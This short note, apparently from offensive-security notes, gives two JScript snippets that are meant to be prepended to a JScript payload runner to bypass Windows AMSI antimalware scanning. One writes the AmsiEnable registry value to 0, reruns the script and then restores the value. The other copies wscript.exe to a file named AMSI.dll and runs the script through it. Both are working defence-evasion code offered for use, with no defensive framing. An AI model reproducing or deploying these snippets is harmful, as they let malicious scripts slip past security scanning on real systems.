Prepend to Jscript script. It sets AmsiEnable registry Key to 0 if it is set to 1, which is how Amsi Bypass is achieved.

```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
var AmsiEnable = sh.RegRead(key);
if(AmsiEnable!=0){
throw new Error(1, '');
}
}catch(e){
sh.RegWrite(key, 0, "REG_DWORD");
sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}" +WScript.ScriptFullName,0,1);
sh.RegWrite(key, 1, "REG_DWORD");
WScript.Quit(1);
}
```

Method#2 with tricking that file is called amsi.dll which won't load amsi at all. Code snip has to be prepended to JS Runner.

```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
{
throw new Error(1, '');
}
}
catch(e)
{
filesys.CopyFile("C:\\Windows\\System32\\wscript.exe","C:\\Windows\\Tasks\\AMSI.dll");
sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
WScript.Quit(1);
}

```